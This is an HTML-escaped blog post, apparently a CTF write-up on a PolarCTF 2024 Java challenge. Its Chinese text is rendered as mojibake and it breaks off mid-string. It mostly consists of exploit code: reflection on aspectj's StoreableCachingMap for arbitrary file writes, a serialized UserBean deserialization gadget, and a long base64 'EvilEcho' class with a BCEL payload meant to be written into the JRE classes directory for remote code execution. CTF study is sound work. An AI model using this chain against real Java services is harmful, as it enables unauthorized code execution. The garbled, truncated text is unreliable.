        <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>é‡åˆ°ä¸¤ä¸ªä¹‹å‰æ²¡ç»ƒè¿‡çš„Javaé¢˜ç±»å‹ï¼Œåšä¸€ä¸‹å­¦å­¦</p><h1 id="ä¸€å†™ä¸€ä¸ªä¸å±å£°"><a href="#ä¸€å†™ä¸€ä¸ªä¸å±å£°" class="headerlink" title="ä¸€å†™ä¸€ä¸ªä¸å±å£°"></a>ä¸€å†™ä¸€ä¸ªä¸å±å£°</h1><aside>ğŸ’¡<p>fatjar rce</p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/image.png" alt="image.png"></p><p>æ ¹æ®æè¿°è‚¯å®šæ˜¯å­˜åœ¨ä¸€ä¸ªä»»æ„æ–‡ä»¶å†™å…¥çš„ï¼Œçœ‹ä¾èµ–æœ‰ä¸ªaspectjweaver-1.9.5.jarï¼Œç®€å•åˆ†æä¸€ä¸‹è¿™ä¸ªjarçš„ä»»æ„æ–‡ä»¶å†™å…¥</p><p>åœ¨\org\aspectj\weaver\tools\cache\SimpleCache.classä¸‹æœ‰ä¸ªå†…éƒ¨ç±»<code>StoreableCachingMap</code> </p><p>åœ¨é‡Œé¢çš„putæ–¹æ³•ä¸­å­˜åœ¨æ–‡ä»¶å†™å…¥</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">public <span class="title class_">Object</span> <span class="title function_">put</span>(<span class="params"><span class="built_in">Object</span> key, <span class="built_in">Object</span> value</span>) &#123;</span><br><span class="line">    <span class="title class_">IOException</span> e;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        e = <span class="literal">null</span>;</span><br><span class="line">        byte[] valueBytes = (byte[])((byte[])value);</span><br><span class="line">        <span class="title class_">String</span> path;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title class_">Arrays</span>.<span class="title function_">equals</span>(valueBytes, <span class="title class_">SimpleCache</span>.<span class="property">SAME_BYTES</span>)) &#123;</span><br><span class="line">            path = <span class="string">&quot;IDEM&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            path = <span class="variable language_">this</span>.<span class="title function_">writeToPath</span>((<span class="title class_">String</span>)key, valueBytes);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>è·Ÿè¿›è¿™ä¸ªwriteToPathæ–¹æ³•</p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/image%201.png" alt="image.png"></p><p>å¯ä»¥çœ‹åˆ°keyä½œä¸ºæ–‡ä»¶åï¼Œ<code>this.folder + File.*separator</code>* ä½œä¸ºç›®å½•ï¼Œ<code>bytes</code> å³putçš„valueä½œä¸ºå†…å®¹ç”Ÿæˆäº†ä¸€ä¸ªæ–‡ä»¶ï¼Œç®€å•å†™ä¸€ä¸ªpayloadè¯•ä¸€ä¸‹</p><p><code>StoreableCachingMap</code> ç±»ç»§æ‰¿äº†HashMapï¼Œæ‰€ä»¥å¯ä»¥åˆ©ç”¨HashMapè§¦å‘put</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">package com.<span class="property">polar</span>.<span class="property">ctf</span>.<span class="property">payload</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.<span class="property">aspectj</span>.<span class="property">weaver</span>.<span class="property">tools</span>.<span class="property">cache</span>.<span class="property">SimpleCache</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.<span class="property">lang</span>.<span class="property">reflect</span>.<span class="property">Constructor</span>;</span><br><span class="line"><span class="keyword">import</span> java.<span class="property">nio</span>.<span class="property">charset</span>.<span class="property">StandardCharsets</span>;</span><br><span class="line"><span class="keyword">import</span> java.<span class="property">util</span>.<span class="property">HashMap</span>;</span><br><span class="line"></span><br><span class="line">public <span class="keyword">class</span> <span class="title class_">WriteFile</span> &#123;</span><br><span class="line">    public <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span>(<span class="title class_">String</span>[] args) throws <span class="title class_">Exception</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="title class_">Class</span>&lt;?&gt; aClass = <span class="title class_">Class</span>.<span class="title function_">forName</span>(<span class="string">&quot;org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap&quot;</span>);</span><br><span class="line">        <span class="title class_">Constructor</span>&lt;?&gt; declaredConstructor = aClass.<span class="title function_">getDeclaredConstructor</span>(<span class="title class_">String</span>.<span class="property">class</span>, int.<span class="property">class</span>);</span><br><span class="line">        declaredConstructor.<span class="title function_">setAccessible</span>(<span class="literal">true</span>);</span><br><span class="line">        <span class="title class_">HashMap</span> hashmap = (<span class="title class_">HashMap</span>) declaredConstructor.<span class="title function_">newInstance</span>(<span class="string">&quot;D:\\desktop\\ctfèµ›é¢˜\\2024\\2024ç§‹å­£ä¸ªäººæŒ‘æˆ˜èµ›PolarCTF\\ä¸€å†™ä¸€ä¸ªä¸å±å£°\\web\\com\\polar\\ctf\\payload&quot;</span>,<span class="number">1</span>);</span><br><span class="line">        hashmap.<span class="title function_">put</span>(<span class="string">&quot;1.txt&quot;</span>,<span class="string">&quot;test&quot;</span>.<span class="title function_">getBytes</span>(<span class="title class_">StandardCharsets</span>.<span class="property">UTF_8</span>));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/image%202.png" alt="image.png"></p><p>æˆåŠŸå†™å…¥ï¼Œå…¶å®è¿™é‡Œå°±å¯ä»¥ç»“åˆCCï¼Œä½†æ˜¯æœ¬é¢˜ä¸­æ²¡æœ‰CCä¾èµ–ï¼Œæ‰€ä»¥å¾—æ‰¾ä¸ªèƒ½è§¦å‘putæ–¹æ³•çš„ï¼Œé¢˜ç›®è¿™é‡Œè‡ªå·±å†™äº†ä¸ªè§¦å‘putçš„ç±»</p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/image%203.png" alt="image.png"></p><p>æ‰€ä»¥åˆ©ç”¨è¿™ä¸ªreadObjectå³å¯</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">package com.<span class="property">polar</span>.<span class="property">ctf</span>.<span class="property">payload</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.<span class="property">polar</span>.<span class="property">ctf</span>.<span class="property">bean</span>.<span class="property">UserBean</span>;</span><br><span class="line"><span class="keyword">import</span> org.<span class="property">aspectj</span>.<span class="property">weaver</span>.<span class="property">tools</span>.<span class="property">cache</span>.<span class="property">SimpleCache</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.<span class="property">io</span>.<span class="property">ByteArrayOutputStream</span>;</span><br><span class="line"><span class="keyword">import</span> java.<span class="property">io</span>.<span class="property">IOException</span>;</span><br><span class="line"><span class="keyword">import</span> java.<span class="property">io</span>.<span class="property">ObjectOutputStream</span>;</span><br><span class="line"><span class="keyword">import</span> java.<span class="property">lang</span>.<span class="property">reflect</span>.<span class="property">Constructor</span>;</span><br><span class="line"><span class="keyword">import</span> java.<span class="property">nio</span>.<span class="property">charset</span>.<span class="property">StandardCharsets</span>;</span><br><span class="line"><span class="keyword">import</span> java.<span class="property">util</span>.<span class="property">Base64</span>;</span><br><span class="line"><span class="keyword">import</span> java.<span class="property">util</span>.<span class="property">HashMap</span>;</span><br><span class="line"></span><br><span class="line">public <span class="keyword">class</span> <span class="title class_">WriteFile</span> &#123;</span><br><span class="line">    public <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span>(<span class="title class_">String</span>[] args) throws <span class="title class_">Exception</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="title class_">Class</span>&lt;?&gt; aClass = <span class="title class_">Class</span>.<span class="title function_">forName</span>(<span class="string">&quot;org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap&quot;</span>);</span><br><span class="line">        <span class="title class_">Constructor</span>&lt;?&gt; declaredConstructor = aClass.<span class="title function_">getDeclaredConstructor</span>(<span class="title class_">String</span>.<span class="property">class</span>, int.<span class="property">class</span>);</span><br><span class="line">        declaredConstructor.<span class="title function_">setAccessible</span>(<span class="literal">true</span>);</span><br><span class="line">        <span class="title class_">Object</span> o = declaredConstructor.<span class="title function_">newInstance</span>(<span class="string">&quot;D:\\desktop\\ctfèµ›é¢˜\\2024\\2024ç§‹å­£ä¸ªäººæŒ‘æˆ˜èµ›PolarCTF\\ä¸€å†™ä¸€ä¸ªä¸å±å£°\\web\\com\\polar\\ctf\\payload&quot;</span>, <span class="number">1</span>);</span><br><span class="line"><span class="comment">//        hashmap.put(&quot;1.txt&quot;,&quot;efaefwafa&quot;.getBytes());</span></span><br><span class="line"></span><br><span class="line">        <span class="title class_">String</span> age = <span class="title class_">Base64</span>.<span class="title function_">getEncoder</span>().<span class="title function_">encodeToString</span>(<span class="string">&quot;1212&quot;</span>.<span class="title function_">getBytes</span>());</span><br><span class="line"></span><br><span class="line">        <span class="title class_">UserBean</span> userBean = <span class="keyword">new</span> <span class="title class_">UserBean</span>(<span class="string">&quot;2.txt&quot;</span>,age,o);</span><br><span class="line">        byte[] bytes = <span class="title function_">serialize</span>(userBean);</span><br><span class="line"></span><br><span class="line">        <span class="title class_">System</span>.<span class="property">out</span>.<span class="title function_">println</span>(<span class="title class_">Base64</span>.<span class="title function_">getEncoder</span>().<span class="title function_">encodeToString</span>(bytes));</span><br><span class="line">    &#125;</span><br><span class="line">    public <span class="keyword">static</span> byte[] <span class="title function_">serialize</span>(<span class="title class_">Object</span> obj) throws <span class="title class_">IOException</span> &#123;</span><br><span class="line">        <span class="title class_">ByteArrayOutputStream</span> baos = <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="title class_">ObjectOutputStream</span> oos = <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line">        oos.<span class="title function_">writeObject</span>(obj);</span><br><span class="line">        <span class="keyword">return</span> baos.<span class="title function_">toByteArray</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/image%204.png" alt="image.png"></p><p>æœ¬åœ°ä¹Ÿæ˜¯æˆåŠŸååºåˆ—åŒ–å†™å…¥ï¼Œä»»æ„æ–‡ä»¶å†™å…¥æˆåŠŸäº†ï¼Œæ¥ä¸‹æ¥å°±æ˜¯è¿™ä¸ªé¢˜ç›®çš„é‡ç‚¹äº†ï¼Œfatjarä¸‹rce</p><p>æœ¬é¢˜æ˜¯å¾€classesä¸‹å†™ä¸€ä¸ªclassæ–‡ä»¶ï¼Œç„¶ååˆ©ç”¨ååºåˆ—åŒ–å»åŠ è½½è¿™ä¸ªå­—èŠ‚ç ï¼ˆçœŸå®ç¯å¢ƒä¸‹classesé»˜è®¤ä¸å­˜åœ¨ï¼‰</p><p>å†™å…¥å­—èŠ‚ç exp</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">package com.<span class="property">polar</span>.<span class="property">ctf</span>.<span class="property">payload</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.<span class="property">polar</span>.<span class="property">ctf</span>.<span class="property">bean</span>.<span class="property">UserBean</span>;</span><br><span class="line"><span class="keyword">import</span> com.<span class="property">sun</span>.<span class="property">org</span>.<span class="property">apache</span>.<span class="property">bcel</span>.<span class="property">internal</span>.<span class="property">Repository</span>;</span><br><span class="line"><span class="keyword">import</span> org.<span class="property">aspectj</span>.<span class="property">weaver</span>.<span class="property">tools</span>.<span class="property">cache</span>.<span class="property">SimpleCache</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.<span class="property">io</span>.<span class="property">ByteArrayOutputStream</span>;</span><br><span class="line"><span class="keyword">import</span> java.<span class="property">io</span>.<span class="property">IOException</span>;</span><br><span class="line"><span class="keyword">import</span> java.<span class="property">io</span>.<span class="property">ObjectOutputStream</span>;</span><br><span class="line"><span class="keyword">import</span> java.<span class="property">lang</span>.<span class="property">reflect</span>.<span class="property">Constructor</span>;</span><br><span class="line"><span class="keyword">import</span> java.<span class="property">nio</span>.<span class="property">charset</span>.<span class="property">StandardCharsets</span>;</span><br><span class="line"><span class="keyword">import</span> java.<span class="property">util</span>.<span class="property">Base64</span>;</span><br><span class="line"><span class="keyword">import</span> java.<span class="property">util</span>.<span class="property">HashMap</span>;</span><br><span class="line"></span><br><span class="line">public <span class="keyword">class</span> <span class="title class_">WriteFile</span> &#123;</span><br><span class="line">    public <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span>(<span class="title class_">String</span>[] args) throws <span class="title class_">Exception</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="title class_">Class</span>&lt;?&gt; aClass = <span class="title class_">Class</span>.<span class="title function_">forName</span>(<span class="string">&quot;org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap&quot;</span>);</span><br><span class="line">        <span class="title class_">Constructor</span>&lt;?&gt; declaredConstructor = aClass.<span class="title function_">getDeclaredConstructor</span>(<span class="title class_">String</span>.<span class="property">class</span>, int.<span class="property">class</span>);</span><br><span class="line">        declaredConstructor.<span class="title function_">setAccessible</span>(<span class="literal">true</span>);</span><br><span class="line"><span class="comment">//        HashMap o = (HashMap) declaredConstructor.newInstance(&quot;/usr/lib/jvm/java-8-openjdk-amd64/jre/classes/&quot;, 1);</span></span><br><span class="line">        <span class="title class_">Object</span> o =  declaredConstructor.<span class="title function_">newInstance</span>(<span class="string">&quot;/usr/lib/jvm/jdk1.8.0_65/jre/classes&quot;</span>, <span class="number">1</span>);</span><br><span class="line"><span class="comment">//        hashmap.put(&quot;1.txt&quot;,&quot;efaefwafa&quot;.getBytes());</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//        String age = Base64.getEncoder().encodeToString(&quot;1212&quot;.getBytes());</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//        String age = &quot;yv66vgAAADQAjgoABgBHCABICgAEAEkHAEoKAAQASwcATAoATQBOBwBPCgAIAEcHAFAKAAoAUQoACgBSCQBTAFQHAFUKAFYAVwoACABYCgBZAFoKAA4AWwoAXABdBwBeCgAUAF8IAGAIAGEHAGIKAAYAYwgAZAoABABlCgBmAGcKAAQAaAcASAcAaQEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAKTEV2aWxFY2hvOwEABG1haW4BABYoW0xqYXZhL2xhbmcvU3RyaW5nOylWAQAJZXZpbENsYXNzAQARTGphdmEvbGFuZy9DbGFzczsBAAxldmlsSW5zdGFuY2UBABJMamF2YS9sYW5nL09iamVjdDsBAAVidG91dAEAH0xqYXZhL2lvL0J5dGVBcnJheU91dHB1dFN0cmVhbTsBAAZvYmpPdXQBABxMamF2YS9pby9PYmplY3RPdXRwdXRTdHJlYW07AQABZQEAFUxqYXZhL2xhbmcvRXhjZXB0aW9uOwEABGFyZ3MBABNbTGphdmEvbGFuZy9TdHJpbmc7AQAWTG9jYWxWYXJpYWJsZVR5cGVUYWJsZQEAFExqYXZhL2xhbmcvQ2xhc3M8Kj47AQANU3RhY2tNYXBUYWJsZQcAXgEACnJlYWRPYmplY3QBAB4oTGphdmEvaW8vT2JqZWN0SW5wdXRTdHJlYW07KVYBAANvaXMBABtMamF2YS9pby9PYmplY3RJbnB1dFN0cmVhbTsBAARjb2RlAQASTGphdmEvbGFuZy9TdHJpbmc7AQALY2xhc3NMb2FkZXIBADNMY29tL3N1bi9vcmcvYXBhY2hlL2JjZWwvaW50ZXJuYWwvdXRpbC9DbGFzc0xvYWRlcjsBAA9sb2FkQ2xhc3NNZXRob2QBABpMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEAC2xvYWRlZENsYXNzAQAKRXhjZXB0aW9ucwEAClNvdXJjZUZpbGUBAA1FdmlsRWNoby5qYXZhDAAgACEBAAhFdmlsRWNobwwAagBrAQAPamF2YS9sYW5nL0NsYXNzDABsAG0BABBqYXZhL2xhbmcvT2JqZWN0BwBuDABvAHABAB1qYXZhL2lvL0J5dGVBcnJheU91dHB1dFN0cmVhbQEAGmphdmEvaW8vT2JqZWN0T3V0cHV0U3RyZWFtDAAgAHEMAHIAcwcAdAwAdQB2AQAQamF2YS9sYW5nL1N0cmluZwcAdwwAeAB7DAB8AH0HAH4MAH8AgAwAIACBBwCCDACDAIQBABNqYXZhL2xhbmcvRXhjZXB0aW9uDACFACEBDX8kJEJDRUwkJCRsJDhiJEkkQSRBJEEkQSRBJEEkQSQ4ZFYkNWJXJFRXJFUkZmUkOGUkcSQ5OWEkWUQkQyRJJGYxUiRjMWskNDBNJGM0JGJiJDQwJGFkJElYJGFjJEIkYWRBJHYkYTJtJDg3JGUxJEEkRCQ5MyQ5OTgzJEIkYjQkZjckN2JrbyRmNmZrJGVkJGNkJGRhJGQ2diRmNSRjOSQ5NyRlOGokOTckYWUkM2UkZjckYTEkN2QkZTlrJDlmJGZhJGQ0JGJlJGY0JGwkZDQkZWUkOTNJNCRSJGFjZSR6JGY2OWdfJGNlJGRlJGZiJGRiJDdiJDlmJGNjJGNmJGZmJGZjcCREJGMwViQ3YyRhNyRhMCRpJDg3JFUkM2MkOGMkYzMkODIkcWUkTSR1OCQ4MiRhMzIkRyRyJDNjJGEyJDQwJGMyJDkwJDg0YyRLJDg2cSQ1YyRjNiRKJFokOGYkY2F4TCRjNiRlMzI0JG4kaCQ5MSRhMSRjYiRZJDk1JGMwJDg1JGM2JDk4JDhjcSRaJFQkSyRNTCR3JGE4JGMxJDk0JE1TJGFjJHYkWiQ5NiRNJDViRlo4JDNiJHYkYzMkOTEkZTAkdyRmMCQ5MCRSZFokYzEkTWYkVjQkZTIkOTQkOGMkZDNiJDdkQiQ5MCR0ZSQzYyRyJGUzaSRKJGNmJHVoJGMxJGIzJFMkOWVjJEl1JFkkOTYkZTEkZWRmJHUkOGI2JGxlJEl0JGQ5JGEzJDljJGExJHdhWCRiYyQzZiQ5MyRnJGUxJGNlJDgwNmIkUyR0JDljJGIwdSRjZCQzYyRhYTkkODY4JGU3JDk5JEJvJGMycCRaViR0bGckM2MkY2VnJGI1VCRkYSRlNHEkY2RNcyRkZCQ5YiQ5YyRlMSRkYTR3JGUyJDdiJGJieiRTJDNkJGZhJDg0JGRkJGNlJG13JGU4ZiRkZSRkOSQ4MiRlOU0kTSRkNSQ4OUltWiQ4YiQ5YiQ5YTUkayRlZjI1JGQ3bSRYJDgyViQ4NiRyRSRDJDg3JDhmJDk5dCQ1ZCRiYyQ4ZiQ3YiRUJGY2aE5jJGIzJDg4JGU2JGI2JGM2JGMxJDkxSVIkYzhJJGI2JEkkYjJVJDkwbSQ4MmwkWGQkODckbSQzYiRGJGQ5VWokOTckZjQkaSRjMyRnJHQkYmIkYjIkZTlWJDhhJGE2ZngkM2VZcFpzWiR2JGE0JGJhJG9hJGNmJGFjJGNlJGQzJDllYSQ1YiRxJGFmTHokOWEkM2UkZDUkYTckYTVzJDg4UHkkciQzY08kYzUkYTUkZWFJJGU4JHMkYTAkWiQ5NCRhNCQ5ZHF0JGJlJGNmJFEkODBVJFckZTAkODgkODkkZWJUbERMJGMyJEwkdyQ1ZSRjNEskdyQ1ZSRjNiR4JE0kaiRFZSRjY00kTCRmN2MkOGUkOTYkZTIzJGI2MyRWJDliJGUxJHAxJGRkJGI2JDNjJDNlJGViJGM1JGkkN2UyJGMzJDVkJF92JGQ4XyRiYiQ3Y3YkYWZtJDhlciRlYSQ4MVdVJGJjJDg2MyRNJGI1JGUzJGRjJGNia3R6JDk0JGNjSCRjNiRlM1QkYTkkYWEkM2IkUVckZjEkM2EkZGUkNjBYdCR0JDlhJDk0JDg1JDhhNyRmMSRXJGMzJDllJGZmJGhPJDkyJDNiJGQzJGU2JGJjTiR4ciRiMSRiOGkkZGJyJEokQyRlNXZkJE0kY2IkODUkZTMkZDkkOTgkZWIkZGIkZGUkYmUkYTMkYTAkNWNOJGNhJDgzJDhlJGUxcUckYzUkZGIkbyRkMjUkYTUkRyRUJDllJDk3JDhlJGY1JFMkdiRmNSRlZSRoJGY2ciQ4ZDAkdiRjOSRjZSRhZiRhYiQ4YSRiM3gkODckZWEkYWUkYTdGJFokcSRkYiQ4ZFkkOTQkOTgkODR3VSRiYyQ4NyRmN1UkN2MkODBzJHEkaSRkYyRkZiRhZiRlMkMkN2NEJDlkJFQkZDdJJHokM2ViWHF3JDgyJDhlJGh1JFYkZTckZjExJGYxJEUkeSQ5ZWlRJHgkZTckNWNkJDNjJGMzJDhjJHR1JGNkJGIyRCR2JCQkYTgkZjgkRSQ5ZiRhYSRmOCRNJDlmSyRmOEIkYzVFJDdjJHYkSyQ3ZSQ4OW44JGRlJGE5JGUyJHgkN2MkYWQkZTIkaCRlMSR3OGZmJGM0JGM1QSRkZCRiNCR6SiRiYWYkOWVWU3EkWiRkZjIkYWMkYmMkZjckYTAxNCRkY216SiRhMCRZJDk4cCRJJGxqSSQzZCRlMzgkZGMkZjIkSyRlNyRkYWhzJGUyTiR6aiRmNCQzYSRDNCRkZmskYjkkY2VJJGQ4JDNlJGI4JDkxJFMkZjUkbyQ5MSRiMCQ5OVckNDAkYzUxaSQ5MyRlM1BBJGEzcyRjN24kY2UkOGQkZWQkN2VBJExZJGVjJDk5JGM3ZngkOGVNJGYzJDdmJGJkJG8kbiRjMyQ5YSRiNiRhNyRJJGVjJDVkJGQxJGI5TyRjOSRmMCQ1Y1YkZjMkN2MkUE41JGM1JGQ0JGNkdVNzJGY4aCRuJGI2SiQ5NyQ3YiQ5ZCRiYSRjZSQ1ZCRkNyRmMCQ5ZiRjOCRlODEkZjEkYWUkVyRmNyRlMCR2JGQ3JGUzJHYkN2YkeSRPOXYkOWEkM2IkZGUkdiQ4NiRiNSRmNyRjMCRlMSRkNiQ4YlQkZTEkZDlHJGQyZCRkNCRhNSQ4OSRCJHYkYWQkZDYkeiRyWUwkYTdmWCRFJGYwJGQyJGUyJDhiJGJiJHM0JHQkdmYkYzQkZDJ5JDdiJGYzMVIkVWUkZjUkeFEzJGI3JDkyJGVkJDg1JGNlJGNlJGIxJE9nJHkkY2ZIJFZGJGI4cCRhOCR4MSRjYiRiMyRjOTAkYzBnOSRjZE00JDNhJGNmJGJiWmxBJFEkSSRiNEokNWQkZTUkOTkkTSRMJGM5JGQ1JDdlJHgkOWQkZjEkYzgkOTJrJDg0WiQ3ZCRjMSQ5ZGEkYzckOGIkRWQkZGUkUSQ5ZFckbSRkMFczJCQkZWYkZTYkYTYkOTEkUyRfJEokYzMkYmEkYmJjJDVkJDNjJGMyJG8kSiQ4YiRmYSQ5ZCQ4YUpRJGU0JGskZmEkQkckZDMkdiRlNyRjNmhzaVYkRlEkOGYkYzlTNEskZWRoJGMyJEckZmEkNWQkVyQ3ZiRMJGMwJGM0M080TiRhNzgkYWQkOGMkZDYkNjAkY2JVJGIwJHg5JGYxJHMkYTIkYTEkaTMkODRWJGEyJGFhJGFmJDgwJGNkJGQ4QiRhYkwkbCRVeSRlMyRGJGRmJGQzJDk1JFYkQSRkMyRhZmFBJFdlJGUxJDQwJFckYzEkRCR6JGUxUCRkOXVIWSRjOCQ4OSRmNSQ4Y3YkZTVZJHUkN2R5JDg1JEtfQSR6JHUkYjQkODQkeCRmMyRkYiRmZSRmNSRoJGYyJGJhbSQ4MSQ4ZCRiNyRiNiRjMSRiYyRkZEIkYjIkTFckZjkkYWEkOGIkZGFCeW4kYjUkZTAkODYkRCRjNCRqJHckTCRkNyRxJDg1SCQ4YUgkVURtJHEkZTQkZDNIJGEwcCQ5MyRpJDkxJG9BUiR6JHQkZDUkM2FSVSQ3ZUJNJDVieSRlOCQzYVEkciRiYyRmOCRnJGVhJGIzaCRJRyRiMlhyJGskZTEkODgkb3Qkb0okbSRiYzR5JFpVJGUyJGI4JHl3JDVjTjQkWSR2T0YkZTQkeSRlZSRMJGFmJHUkZjYkaSQ5MSRmZCRjYiQ3ZkQkZTMkZDA1NEUkOTQkeVZmJGIxJGVhJHdWJDg3JGQ3ZCRiMTYkOGJ1JGMyJGU5JGEwbyRaJGNkZyRTJDkxJGYzJGUxJGU1JGY5JGNkcyRmOCQ5N1EkN2UkYTAkciQ4YiRmNSQ4M1dEJFIkZDgkUSQzYk4kbEplJGI5JFM5WEYkYjQkOWMkY2EkYTMkYTAkOWUkY2EkZDAkRSRmMSQ5YVdiJHQkVyRhMiRMVSRlOCRjNyRvJE0kYTEkZzYkYzI4Q19oZ1EkOGJzJGE4JGMzJHIkeSRHJGU1JDhiJGhoJGMwJF8kODgkZTA3JHkkYzEkZWZ0JGQ3JGxYJDhlJDNmJGIxJEMkN2YkYTMkOTE1JGEzJDg5dWIkciRoJGMyJGckZjIkYjgkOGEkOWQkYzBqNiQ4MiRiNSRiOXY4TSQ3ZVQkZDYkODdtJGQ4TiRhN3okYjYkWCQzYiRjOCR0JHAkOGIkOWQkZDgkODU2aiRhMCQkJGI2JFkkZWQkYzQkeEMkM2YkYWIkNDAkSCRmMSRDJFkkYTIkZjAkZWYkYTckNWQkOTAkZTIkZjkkTCRiYkkkZyRhMiRhOCQ3ZSRjNSREJGI0JDkzJHUkYTYkeSRmNiQ5MFQkYTYkYzgkJCRhMiRUJDdiJHYkYWYkaCRiOCQ0MHl0QyRuJGVmQSRmNCQ2MCRseSQ3YiQ5MCRmZSRiNyRwcCQ5MyRDJGFlJDkwJGQwJHhhJGJmJDg0JDg3JEskZDQkZGYkZjgkZmIkRCRTJFMkNDAkYzVNQiQ4OSQ2MCQ5MyRkMCRYJGE0JEkkZmJzJGVkJDdkJGYwX2ckZjlqJGskWSRMJEEkQQEAMWNvbS5zdW4ub3JnLmFwYWNoZS5iY2VsLmludGVybmFsLnV0aWwuQ2xhc3NMb2FkZXIBADFjb20vc3VuL29yZy9hcGFjaGUvYmNlbC9pbnRlcm5hbC91dGlsL0NsYXNzTG9hZGVyDACGAIcBAAlsb2FkQ2xhc3MMAIgAiQcAigwAiwCMDABvAI0BABRqYXZhL2lvL1NlcmlhbGl6YWJsZQEAB2Zvck5hbWUBACUoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvQ2xhc3M7AQAWZ2V0RGVjbGFyZWRDb25zdHJ1Y3RvcgEAMyhbTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZsZWN0L0NvbnN0cnVjdG9yOwEAHWphdmEvbGFuZy9yZWZsZWN0L0NvbnN0cnVjdG9yAQALbmV3SW5zdGFuY2UBACcoW0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBABkoTGphdmEvaW8vT3V0cHV0U3RyZWFtOylWAQALd3JpdGVPYmplY3QBABUoTGphdmEvbGFuZy9PYmplY3Q7KVYBABBqYXZhL2xhbmcvU3lzdGVtAQADb3V0AQAVTGphdmEvaW8vUHJpbnRTdHJlYW07AQAQamF2YS91dGlsL0Jhc